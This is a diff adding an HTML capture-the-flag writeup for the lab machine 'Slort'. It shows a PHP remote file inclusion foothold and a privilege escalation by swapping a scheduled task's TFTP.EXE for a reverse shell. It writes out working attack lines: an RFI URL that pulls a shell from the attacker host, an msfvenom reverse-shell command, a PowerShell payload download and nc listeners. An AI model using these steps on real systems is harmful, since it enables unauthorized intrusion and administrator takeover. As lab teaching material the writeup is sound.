@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Slort &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Slort</h1>
+    <div class="meta">Target: <code>192.168.180.53</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">RFI</span><span class="tag">PHP</span><span class="tag">XAMPP</span><span class="tag">ScheduledTask</span><span class="tag">BinaryReplacement</span><span class="tag">msfvenom</span><span class="tag">LFI</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#remote-file-inclusion-shell-as-rupert">Remote File Inclusion → Shell as rupert</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#scheduled-task-binary-replacement-c-backup-tftp-exe">Scheduled Task Binary Replacement, C:\Backup\TFTP.EXE</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Slort is a Windows machine where a PHP remote file inclusion vulnerability on a XAMPP-backed site gives the initial foothold. Privilege escalation exploits a scheduled task that runs <code>TFTP.EXE</code> from a user-writable <code>C:\Backup</code> directory every five minutes. Renaming the original binary and dropping a reverse-shell payload in its place produces an administrator shell without needing any exploit.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql?
+4443/tcp open  http          Apache httpd 2.4.43 (Win64) PHP/7.4.6
+8080/tcp open  http          Apache httpd 2.4.43 (Win64) PHP/7.4.6
+</code></pre>
+<p>Two Apache/PHP instances on ports 4443 and 8080. SMB signing not required. FTP on 21 with FileZilla.</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>GoBuster against port 8080 found a <code>/site</code> directory that redirected to:</p>
+<pre><code>http://192.168.180.53:8080/site/index.php?page=main.php
+</code></pre>
+<p>The <code>?page=</code> parameter immediately suggested file inclusion. Testing with a single quote:</p>
+<pre><code>http://192.168.180.53:8080/site/index.php?page=%27
+</code></pre>
+<p>The error confirmed PHP <code>include()</code> with unsanitized input:</p>
+<pre><code>Warning: include('): failed to open stream: No such file or directory in
+  C:\xampp\htdocs\site\index.php on line 4
+Warning: include(): Failed opening ''' for inclusion
+  (include_path='C:\xampp\php\PEAR') in C:\xampp\htdocs\site\index.php on line 4
+</code></pre>
+<blockquote>
+<p><strong>Why <code>include()</code> errors are diagnostic gold:</strong> the error message discloses the full server-side path (<code>C:\xampp\htdocs\site\index.php</code>), confirms PHP's <code>include()</code> is the mechanism, and reveals the <code>include_path</code>. This tells an attacker the XAMPP root layout and confirms RFI is possible if <code>allow_url_include</code> is enabled, which it is when the error shows the application successfully loaded <code>main.php</code> from a URL before.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="remote-file-inclusion-shell-as-rupert">Remote File Inclusion → Shell as rupert</h3>
+<p>With <code>include()</code> confirmed, the next test was whether the server would fetch and execute a remote PHP file. A PHP reverse shell was hosted on Kali's HTTP server:</p>
+<pre><code class="language-sh">python3 -m http.server 80
+</code></pre>
+<p>Triggered via RFI:</p>
+<pre><code>http://192.168.180.53:8080/site/index.php?page=http://192.168.45.244/phpshell.php
+</code></pre>
+<p>The target fetched the shell:</p>
+<pre><code>192.168.180.53 - - &quot;GET /phpshell.php HTTP/1.0&quot; 200 -
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.53] 51046
+
+C:\xampp\htdocs\site&gt;whoami
+slort\rupert
+</code></pre>
+<pre><code class="language-powershell">C:\Users\rupert\Desktop&gt;type local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="scheduled-task-binary-replacement-c-backup-tftp-exe">Scheduled Task Binary Replacement, C:\Backup\TFTP.EXE</h3>
+<p>Manual filesystem enumeration surfaced a <code>C:\Backup</code> directory at the root of the C drive. An <code>info.txt</code> within it documented the scheduled task:</p>
+<pre><code class="language-powershell">C:\Backup&gt;type info.txt
+Run every 5 minutes:
+C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
+</code></pre>
+<blockquote>
+<p><strong>Why a scheduled task in a user-writable directory is instant privilege escalation:</strong> Windows scheduled tasks run under a configured account, often SYSTEM or a local admin. If the binary the task invokes sits in a directory where a low-privilege user can write, the attacker simply replaces the binary. The next time the task fires, the scheduler invokes the attacker's payload with the task's privilege level, no exploits, no race conditions, just a write and a wait.</p>
+</blockquote>
+<p>Checking write permission on <code>C:\Backup</code>, confirmed by the rename succeeding:</p>
+<pre><code class="language-powershell">C:\Backup&gt;move TFTP.EXE TFTP.bak
+        1 file(s) moved.
+</code></pre>
+<p>A reverse-shell binary was generated and named to match:</p>
+<pre><code class="language-sh">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=53 \
+  -f exe -o TFTP.EXE
+</code></pre>
+<p>Downloaded to the target via PowerShell:</p>
+<pre><code class="language-powershell">PS C:\Backup&gt; iwr -uri http://192.168.45.244:8000/TFTP.EXE -OutFile TFTP.EXE
+</code></pre>
+<p>Listener opened on port 53. After waiting up to five minutes for the task to fire:</p>
+<h2 id="root-system">Root / SYSTEM</h2>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.53] 51094
+
+C:\WINDOWS\system32&gt;whoami
+slort\administrator
+</code></pre>
+<pre><code class="language-powershell">C:\Users\Administrator\Desktop&gt;type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>A <code>?page=</code> parameter backed by PHP <code>include()</code> is RFI until proven otherwise.</strong> The error message confirmed the mechanism and disclosed the filesystem layout in one request.</li>
+<li><strong><code>info.txt</code> files in unusual directories document attacker-useful automation.</strong> A scheduled task description file left in a writable directory described the exact binary name, path, and execution interval, all the information needed to plan the replacement.</li>
+<li><strong>Binary replacement attacks need only write permission and patience.</strong> No exploit, no UAC bypass, just a renamed legitimate binary and a five-minute wait. The task scheduler does the rest.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
